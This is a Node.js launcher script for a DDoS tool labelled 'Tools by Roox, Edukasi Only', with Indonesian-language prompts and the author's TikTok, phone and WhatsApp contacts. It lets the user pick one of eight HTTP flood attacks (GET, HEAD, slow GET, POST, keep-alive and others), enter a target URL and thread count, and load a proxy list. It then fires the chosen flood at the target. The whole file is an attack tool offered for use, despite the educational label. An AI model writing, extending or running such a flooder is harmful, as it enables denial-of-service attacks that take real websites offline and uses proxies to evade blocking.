const inquirer = require('inquirer');
const fs = require('fs-extra');
const chalk = require('chalk');
const config = require('./config');

const methods = {
  'HTTP GET Flood': require('./methods/httpget'),
  'HTTP HEAD Flood': require('./methods/httphead'),
  'Random Query Flood': require('./methods/randomquery'),
  'Slow GET Flood': require('./methods/slowget'),
  'POST Flood': require('./methods/postflood'),
  'Keep-Alive Flood': require('./methods/keepalive'),
  'User-Agent Flood': require('./methods/useragent'),
  'Referer Flood': require('./methods/refererflood')
};

(async () => {
  console.clear();

  // Header Box Tanpa Gradient
  console.log(chalk.cyan(`
╔══════════════════════════════════════════════╗
║                                              ║
║      TOOLS BY ROOX • V1.0 • EDUKASI ONLY     ║
║                                              ║
╚══════════════════════════════════════════════╝
`));

  // Kontak Info
  console.log(chalk.green.bold('📱 Tiktok : ') + chalk.white('tiktok.com/@rooxjsphire'));
  console.log(chalk.green.bold('📞 Contact: ') + chalk.white('6288991838060'));
  console.log(chalk.green.bold('🌐 Info   : ') + chalk.white('https://whatsapp.com/channel/0029Vb6JTAHGJP8HbYcugb3p'));
  console.log(chalk.gray('─────────────────────────────────────────────\n'));

  // Pilihan metode
  const { method } = await inquirer.prompt({
    type: 'list',
    name: 'method',
    message: chalk.yellow('🚀 Pilih metode serangan:'),
    choices: Object.keys(methods),
    pageSize: 8
  });

  const { target } = await inquirer.prompt({
    type: 'input',
    name: 'target',
    message: chalk.yellow('🎯 Masukkan target URL:')
  });

  const { threads } = await inquirer.prompt({
    type: 'input',
    name: 'threads',
    message: chalk.yellow('⚙️  Jumlah thread (default 100):'),
    default: config.defaultThreads
  });

  let proxyList = [];
  if (fs.existsSync(config.proxyFile)) {
    const data = fs.readFileSync(config.proxyFile, 'utf8');
    proxyList = data.split('\n').filter(Boolean);
  }

  console.log(chalk.green(`\n🔥 Menjalankan metode: ${method}`));
  console.log(chalk.green(`🔗 Target: ${target}`));
  console.log(chalk.green(`🧵 Threads: ${threads}`));
  console.log(chalk.green(`🌐 Jumlah Proxy: ${proxyList.length}`));
  console.log(chalk.gray('─────────────────────────────────────────────\n'));

  methods[method](target, parseInt(threads), proxyList);
})();
